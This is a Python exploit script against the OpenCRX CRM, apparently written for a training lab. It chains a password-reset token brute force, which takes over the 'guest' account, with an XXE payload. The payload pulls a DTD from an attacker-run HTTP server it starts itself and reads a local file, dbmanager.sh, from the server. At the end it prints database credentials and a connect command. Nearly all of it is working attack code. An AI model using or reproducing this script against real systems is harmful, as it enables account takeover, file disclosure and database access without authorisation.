#!/usr/bin/env python3

import requests 
import argparse 
import traceback
import subprocess
import time
from http.cookies import SimpleCookie
import http.server 
import socketserver
import threading
import os
import json


"""
Usage: /usr/bin/python3 xxe_lfd.py 192.168.45.176
"""

def ResetPassword():
    """
    Request password reset for the `guest` user
    """
    ReqPassRstUrl = "http://opencrx:8080/opencrx-core-CRX/RequestPasswordReset.jsp"
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    ReqPassRstData = {"id": "guest"}
    try:
        epoch_time_milis_start = int(time.time() * 1000)
        ReqPassRst = requests.post(ReqPassRstUrl, headers=headers, data=ReqPassRstData)
        epoch_time_milis_end = int(time.time() * 1000)
        if "Password reset request successful for guest" in ReqPassRst.text:
            print("[+] Password Reset Requested for the user `guest`")

            """
            Generate password reset token list
            """
            try:
                GenTknLstCommand = f"java OpenCRXToken {epoch_time_milis_start} {epoch_time_milis_end} > tokens.txt"
                subprocess.run(GenTknLstCommand, shell=True, check=True)
                
                """
                Bruteforce the correct password reset token
                """
                PassRstCfrmUrl = "http://opencrx:8080/opencrx-core-CRX/PasswordResetConfirm.jsp"
                print("[*] Starting token spray attack. Standby")
                with open("tokens.txt", "r") as file:
                    for token in file:
                        token = token.rstrip()
                        PassRstCfrmData = {
                            "t": f"{token}",
                            "p": "CRX",
                            "s": "Standard",
                            "id": "guest",
                            "password1": "NewPassword!1234",
                            "password2": "NewPassword!1234"
                        }
                        try:
                            PassRstCfrmRes = requests.post(PassRstCfrmUrl, data=PassRstCfrmData)
                            if "Unable to reset password" not in PassRstCfrmRes.text and "Password successfully changed for" in PassRstCfrmRes.text:
                                print(f"[+] Valid token: {token}")
                                print("[+] Password reset was successfull for user `guest`")
                                print("[+] Login with `guest`:`NewPassword!1234`")
                                return True
                            elif "Invalid password confirm request" in PassRstCfrmRes.text:
                                print("[-] Invalid password confirm request")
                        except Exception as e:
                            print("[-] Error spraying password reset tokens: ", e)
                return False
            except FileNotFoundError as e:
                print("[-] OpenCRXToken executable not found: ", e)
                print("[*] Place the `OpenCRXToken.class` in the current working directory.")
                return False
            except subprocess.CalledProcessError as e:
                print("Command failed with return code:", e.returncode)
                return False
            except Exception as e:
                print("[-] Unexpected Error: ", e)
                traceback.print_exc()
                return False
        else:
            print("[-] Failed to request password reset for the user `guest`")
            return False
    except Exception as e:
        print("[-] Error requesting password reset: ", e)
        traceback.print_exc()
        return False


def start_http_server(port=80):
    """Start HTTP server in a separate thread"""
    FILENAME = "wrapper.dtd"
    CONTENT = '<!ENTITY wrapper "%start;%file;%end;">'
    
    # Create the DTD file
    with open(FILENAME, "w") as f:
        f.write(CONTENT)
    
    class SingleRequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/' + FILENAME or self.path == '/' or self.path == '/wrapper.dtd':
                # Serve the file
                self.send_response(200)
                self.send_header("Content-type", "application/xml")
                self.send_header("Content-Length", str(os.path.getsize(FILENAME)))
                self.end_headers()
                with open(FILENAME, "rb") as f:
                    self.wfile.write(f.read())
                print(f"[+] Served {FILENAME} to {self.client_address[0]}")
                
                # Stop the server after serving this request
                threading.Thread(target=self.server.shutdown).start()
            else:
                # For other paths, send 404
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'File not found.')
    
    try:
        with socketserver.TCPServer(("", port), SingleRequestHandler) as httpd:
            print(f"[*] Starting HTTP server on port {port}...")
            httpd.serve_forever()
    except Exception as e:
        print(f"[-] Error starting HTTP server: {e}")


def xxe_lfd(lhost):
    """
    Login to the guest account and perform XXE attack
    """
    loginUrl = "http://opencrx:8080/opencrx-core-CRX/j_security_check"
    LoginHeaders = {"Content-Type": "application/x-www-form-urlencoded"}
    LoginData = {"j_username": "guest", "j_password": "NewPassword!1234"}
    
    try:
        loginRes = requests.post(loginUrl, headers=LoginHeaders, data=LoginData, allow_redirects=True)
        raw_cookie_header = loginRes.headers.get("Set-Cookie", "")
        cookie = SimpleCookie()
        cookie.load(raw_cookie_header)
        jsession_cookie = cookie.get("JSESSIONID")
        
        if jsession_cookie and jsession_cookie.value:
            JSESSIONID_value = jsession_cookie.value
            print("[+] Logged-in as guest")
            print("[+] JSESSIONID: ", JSESSIONID_value)

            # Start HTTP server in background thread
            server_thread = threading.Thread(target=start_http_server, args=(80,))
            server_thread.daemon = True
            server_thread.start()
            
            # Give server time to start
            time.sleep(2)
            print("[*] HTTP server should be running...")

            # Prepare XXE payload
            xxe_url = "http://opencrx:8080/opencrx-rest-CRX/org.opencrx.kernel.account1/provider/CRX/segment/Standard/account"
            xxe_headers = {
                "Content-Type": "application/xml", 
                "Authorization": "Basic Z3Vlc3Q6TmV3UGFzc3dvcmQhMTIzNA=="
            }
            xxe_data = f"""<?xml version="1.0"?>
                            <!DOCTYPE data [
                            <!ENTITY % start "<![CDATA[">
                            <!ENTITY % file SYSTEM "file:///home/student/crx/data/hsqldb/dbmanager.sh" >
                            <!ENTITY % end "]]>">
                            <!ENTITY % dtd SYSTEM "http://{lhost}/wrapper.dtd" >
                            %dtd;
                            ]>
                            <org.opencrx.kernel.account1.Contact>
                            <lastName>&wrapper;</lastName>
                            <firstName>Tom</firstName>
                            </org.opencrx.kernel.account1.Contact>"""

            # Send XXE request
            print("[*] Sending XXE payload...")
            print("[*] Reading the /hsqldb/dbmanager.sh file...")
            try:
                lfdRes = requests.post(xxe_url, headers=xxe_headers, data=xxe_data, timeout=10)
                with open("response.txt", "w") as res:
                    res.write(lfdRes.text)
                    print("[+] Response has been saved to response.json")
                print("[+] XXE Response:")
                try:
                    print("[+] /hsqldb/dbmanager.sh content: \n", lfdRes.json())
                    
                except:
                    print(lfdRes.text)
            except Exception as e:
                print("[-] Failed to deliver the XXE attack:", e)
                traceback.print_exc()

            # Wait for server thread to finish
            server_thread.join(timeout=10)
            print("[*] HTTP server stopped")

        else:
            print("[-] JSESSIONID cookie not found or empty. Login failed.")
            return False
            
    except Exception as e:
        print("[-] Error in XXE attack: ", e)
        traceback.print_exc()
        return False
    
    return True

def main():
    parser = argparse.ArgumentParser(description='OpenCRX Exploit')
    parser.add_argument('lhost', help='Your IP address for XXE callback')
    args = parser.parse_args()
    
    # Step 1: Reset password
    if ResetPassword():
        print("[*] Password reset successful, proceeding with XXE attack...")
        # Step 2: XXE attack
        if xxe_lfd(args.lhost):
            print("[+] Use `sa`:`manager99` to login to HSQLDB")
            print("[+] Use `java -cp ~/hsqldb-2.7.4/hsqldb/lib/hsqldb.jar org.hsqldb.util.DatabaseManagerSwing --url jdbc:hsqldb:hsql://opencrx:9001/CRX --user sa --password manager99` to connect to the target's database")
        else:
            print("[-] Failed to read /hsqldb/dbmanager.sh")
    else:
        print("[-] Password reset failed, aborting...")


if __name__ == "__main__":
    main()

